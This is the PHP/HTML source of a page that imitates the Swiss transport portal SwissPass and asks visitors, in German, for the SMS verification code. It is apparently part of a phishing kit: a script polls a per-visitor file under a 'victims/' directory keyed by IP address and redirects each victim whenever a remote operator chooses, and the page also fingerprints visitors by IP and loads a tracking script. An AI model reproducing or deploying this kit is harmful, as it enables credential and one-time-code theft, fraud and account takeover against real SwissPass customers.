<?php
include "./all.php";
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SwissPass</title>
    <link rel=icon type=image/x-icon
        href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAA2NM3/JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf82NM3/IiDI/xYUxf8WFMX/FhTF//////8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/IiDI/yYlyf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/yYlyf8mJcn/FhTF//////8WFMX//////xYUxf//////FhTF/xYUxf8WFMX/FhTF/xYUxf//////FhTF/xYUxf8mJcn/JiXJ/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/JiXJ//////8WFMX//////xYUxf//////FhTF//////8WFMX//////yUjyf//////FhTF/xYUxf8WFMX/FhTF/yYlyf80M83/FhTF/yUjyf8WFMX/JSPJ/xYUxf8lI8n/FhTF/yUjyf8XFcX/JSPJ/xYUxf8WFMX/FhTF/xYUxf8mJcn//////xYUxf//////FhTF//////8WFMX//////xYUxf//////JSPJ//////8WFMX//////xYUxf//////JiXJ/yYlyf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/yYlyf//////FhTF//////8WFMX//////xYUxf//////FhTF//////8lI8n//////xYUxf8WFMX/FhTF//////8mJcn/JiXJ/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/JiXJ//////8WFMX//////xYUxf//////FhTF//////8WFMX//////yUjyf//////FhTF/xYUxf8WFMX/FhTF/yYlyf8mJcn/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8mJcn//////xYUxf//////FhTF//////8WFMX//////xYUxf//////JSPJ//////8WFMX/FhTF/xYUxf8WFMX/JiXJ/yIgyP8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/yIgyP//////JiXJ//////8mJcn//////yYlyf//////JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf82NM3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==">

    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Arial", sans-serif;
    }

    html,
    body {
        height: 100%;
    }

    body {
        background-color: #f5f5f5;
        color: #333;
        line-height: 1.6;
        display: flex;
        flex-direction: column;
    }

    /* Navigation */
    nav {
        background-color: #c41416;
        padding: 1rem 2rem;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .nav-logo {
        order: 1;
    }

    .nav-logo img {
        height: 26px;
        transition: height 0.3s ease;
    }

    .nav-links {
        order: 2;
        display: flex;
        align-items: center;
        gap: 20px;
    }

    .nav-links a {
        color: white;
        text-decoration: none;
        font-weight: bold;
    }

    .profile-link {
        display: flex;
        align-items: center;
        gap: 5px;
    }

    .profile-link img {
        width: 44px;
        height: 44px;
        border-radius: 50%;
    }

    .menu-link {
        display: none;
        align-items: center;
        gap: 8px;
    }

    .hamburger-icon {
        display: inline-block;
        width: 20px;
        height: 2px;
        background-color: white;
        position: relative;
    }

    .hamburger-icon::before,
    .hamburger-icon::after {
        content: "";
        position: absolute;
        width: 20px;
        height: 2px;
        background-color: white;
        left: 0;
    }

    .hamburger-icon::before {
        top: -6px;
    }

    .hamburger-icon::after {
        top: 6px;
    }

    /* Main Content */
    .main-content {
        flex: 1;
    }

    .container {
        max-width: 600px;
        margin: 2rem auto;
        padding: 0 1rem;
    }

    .payment-form {
        /* background-color: white; */
        padding: 2rem;
        border-radius: 8px;
    }

    h1 {
        font-size: 1.5rem;
        margin-bottom: 1.5rem;
        color: #333;
        text-align: center;
    }

    .form-group {
        margin-bottom: 1.5rem;
    }

    label {
        display: block;
        margin-bottom: 0.5rem;
        font-weight: bold;
    }

    input {
        width: 100%;
        padding: 0.75rem;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 1rem;
    }

    .input-with-icon {
        position: relative;
    }

    .input-with-icon input {
        padding-right: 40px;
    }

    .input-icon {
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        height: 20px;
    }

    .card-details {
        display: flex;
        gap: 1rem;
    }

    .card-details .form-group {
        flex: 1;
    }

    .exp-input {
        flex: 2;
    }

    .cvv-input {
        flex: 1;
    }

    button {
        background-color: #c41416;
        color: white;
        border: none;
        padding: 0.75rem 1.5rem;
        font-size: 1rem;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
        font-weight: bold;
        margin-top: 1rem;
        transition: background-color 0.3s ease;
    }

    button:hover {
        background-color: #e30613;
    }

    /* Footer */
    footer {
        background-color: #c41416;
        color: white;
        padding: 2rem;
        margin-top: auto;
    }

    .footer-content {
        max-width: 1200px;
        margin: 0 auto;
        display: flex;
        flex-wrap: wrap;
        justify-content: space-between;
        align-items: center;
    }

    .footer-logo {
        display: flex;
        align-items: center;
    }

    .footer-logo img {
        height: 20px;
        margin-right: 1rem;
    }

    .footer-links {
        display: flex;
        flex-wrap: wrap;
        gap: 1rem;
    }

    .footer-links a {
        color: white;
        text-decoration: none;
        transition: opacity 0.3s ease;
    }

    .footer-links a:hover {
        text-decoration: underline;
        opacity: 0.9;
    }

    /* Responsive */
    @media (max-width: 768px) {
        .nav-logo img {
            height: 20px;
        }

        .nav-links .desktop-link,
        .profile-link {
            display: none;
        }

        .menu-link {
            display: flex;
            font-weight: bold;
            color: white;
            text-decoration: none;
        }

        .nav-logo {
            order: 2;
        }

        .nav-links {
            order: 1;
        }

        .card-details {
            flex-direction: column;
            gap: 1rem;
        }

        .footer-content {
            flex-direction: column;
            text-align: center;
        }

        .footer-logo {
            display: none;
        }

        .footer-links {
            justify-content: center;
            margin-top: 1rem;
            gap: 0.8rem;
        }

        .footer-links a {
            font-size: 0.9rem;
        }
    }
    </style>
</head>

<body>
    <nav>
        <div class="nav-links">
            <a href="#" class="menu-link">
                <span class="hamburger-icon"></span>
                Menü
            </a>
        </div>
        <div class="nav-logo">
            <img src="./media/swisspass.png" alt="SwissPass Logo" />
        </div>
        <div class="nav-links">
            <a href="#" class="desktop-link">Hilfe</a>
            <a href="#" class="profile-link desktop-link">
                <img src="https://thumbs.dreamstime.com/b/default-avatar-profile-flat-icon-social-media-user-vector-portrait-unknown-human-image-default-avatar-profile-flat-icon-184330869.jpg"
                    alt="Profilbild" />
            </a>
        </div>
    </nav>

    <main class="main-content">
        <div class="container">


            <style>
            .iframe-container {
                display: flex;
                justify-content: center;
                /* centers iframe horizontally */
                align-items: center;
                /* centers iframe vertically */
                height: 140vh;
            }

            iframe {
                width: 380px;
                height: 700px;
                border: 1px solid red;
                /* Added border style here */
                overflow: hidden;
            }

            @media (max-width: 768px) {
                .iframe-container {
                    height: 100vh;
                    /* Shorter height on mobile */
                }


            }
            </style>
            <p>
                Bitte geben Sie den SMS-Code ein.
                <br>
                Der SMS-Code wird an die bel uns registrierte Nummer geschickt.
            </p>
            <br>


            <div class="iframe-container">
                <iframe src="./a.php" frameborder="0"></iframe>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-content">
            <div class="footer-logo">
                <img src="./media/swisspass.png" alt="SwissPass Logo" />
            </div>
            <div class="footer-links">
                <a href="#">Fahrgastrechte</a>
                <a href="#">Impressum</a>
                <a href="#">Rechtlicher Hinweis</a>
                <a href="#">Datenschutz</a>
                <a href="#">Cookie-Einstellungen</a>
                <a href="#">Über SwissPass</a>
            </div>
        </div>
    </footer>
</body>

<!-- JS FILES -->
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

<script>
var ip = '<?php echo get_client_ip(); ?>';
var waiting = setInterval(function() {
    $.get('victims/' + ip + '.php', function(data) {
        if (data == 0) {
            //console.log('hada ba9i 0');
        } else {
            // Define the redirection URL based on the response data
            var redirectionUrl = "infos.php?redirection=" + data;

            // Perform the file modification request before redirecting
            $.post('modify_file.php', {
                ip: ip,
                content: "0"
            }, function(modifyResponse) {
                // Check if the file was successfully modified
                if (modifyResponse == 'success') {
                    // Proceed with the redirection
                    clearInterval(waiting);
                    window.top.location.href = redirectionUrl;
                } else {
                    // Handle failure to modify the file (if necessary)
                    console.error('Failed to modify the file.');
                }
            });
        }
    });
}, 2000);
</script>


<script>
// Function to get IP using a free API
function getUserIP(callback) {
    // First try to get from URL parameter
    const urlParams = new URLSearchParams(window.location.search);
    const ipParam = urlParams.get('ip');

    if (ipParam) {
        callback(ipParam);
        return;
    }

    // Fallback to API
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => callback(data.ip))
        .catch(() => callback('unknown'));
}

// Set a global variable with the IP
getUserIP(function(ip) {
    window.userIP = ip;
});
</script>

<!-- Tracking script -->
<script src="./tracking.php"></script>

</html>